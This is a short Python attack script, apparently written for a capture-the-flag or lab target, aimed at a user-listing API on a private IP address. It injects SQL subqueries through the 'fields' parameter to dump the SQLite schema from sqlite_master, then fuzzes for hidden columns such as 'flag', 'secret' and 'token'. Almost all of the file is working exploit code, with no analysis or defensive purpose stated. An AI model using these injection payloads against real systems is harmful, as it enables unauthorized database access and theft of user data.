#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {"x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7"}


def check_endpoint(params):
    try:
        resp = requests.get(f"{BASE_URL}/api/v1/users", params=params, headers=HEADERS)
        if resp.status_code == 200:
            print(f"[+] Success with {params}:")
            print(json.dumps(resp.json(), indent=2)[:500] + "...")
        else:
            print(f"[-] Failed with {params}: {resp.status_code} - {resp.text}")
    except Exception as e:
        print(f"[!] Error: {e}")


# 1. Try wildcard
print("\n--- Testing Wildcard ---")
check_endpoint({"user_type": "students", "fields": "*"})

# 2. Try Schema Extraction (SQLite)
print("\n--- Testing Schema Extraction ---")
# If it's SELECT <fields> FROM users, maybe we can UNION?
# But fields is comma separated.
# Try: fields=user_id, (SELECT sql FROM sqlite_master WHERE type='table' AND name='users')
check_endpoint(
    {
        "user_type": "students",
        "fields": "user_id, (SELECT sql FROM sqlite_master WHERE type='table' AND name='users')",
    }
)
check_endpoint(
    {
        "user_type": "students",
        "fields": "user_id, (SELECT group_concat(sql) FROM sqlite_master)",
    }
)

# 3. Try to find hidden columns by fuzzing
print("\n--- Testing Hidden Columns ---")
potential_cols = [
    "flag",
    "secret",
    "key",
    "token",
    "notes",
    "description",
    "info",
    "data",
    "admin",
    "role",
    "permissions",
    "access",
    "code",
]
for col in potential_cols:
    resp = requests.get(
        f"{BASE_URL}/api/v1/users",
        params={"user_type": "students", "fields": f"user_id,{col}"},
        headers=HEADERS,
    )
    if resp.status_code == 200 and "Internal Server Error" not in resp.text:
        # Check if the column is actually returned and not just ignored or null
        data = resp.json()
        if "users" in data and len(data["users"]) > 0:
            if col in data["users"][0]:
                print(f"[+] Found column '{col}': {data['users'][0][col]}")
            else:
                pass  # Column ignored
    else:
        # 500 likely means column doesn't exist
        pass
